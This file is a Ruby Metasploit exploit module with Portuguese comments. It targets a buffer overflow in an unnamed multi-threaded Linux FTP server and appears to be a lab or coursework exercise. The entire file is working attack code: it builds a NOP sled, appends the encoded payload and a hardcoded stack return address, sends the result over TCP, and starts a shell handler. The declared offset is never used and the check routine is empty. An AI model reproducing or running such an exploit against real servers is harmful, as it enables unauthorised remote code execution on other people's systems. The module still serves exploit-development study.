
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Buffer overflow no Linux',
      'Description'    => %q{
          Este modulo explora uma vulnerabilidade de buffer overflow num servidor multi-thread FTP no sistema operativo Linux.
      },
      'Author'         => 'Bruno Ramos',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
        ],

      'Payload'        =>
        {
          'Space'    => 128,
          'BadChars' => "\x00",
        },
      'Targets'        =>
        [
          [
            'Linux', 
            {
              'Platform' => 'lin',
              'Ret'      => 0xbfffed94, 
              'Offset'   => 204,
            },
          ],
          
        ],
      'DisclosureDate' => '24 de Julho de 2016',
      'DefaultTarget' => 0))

    
  end

  def check
end
  def exploit
    connect

    print_status("A explorar alvo #{target.name}...")

    buf = make_nops(76)
    buf << payload.encoded
    buf << [ target.ret ].pack('V')	
    

    sock.put(buf)
    sock.get_once

    handler
    disconnect
  end

end
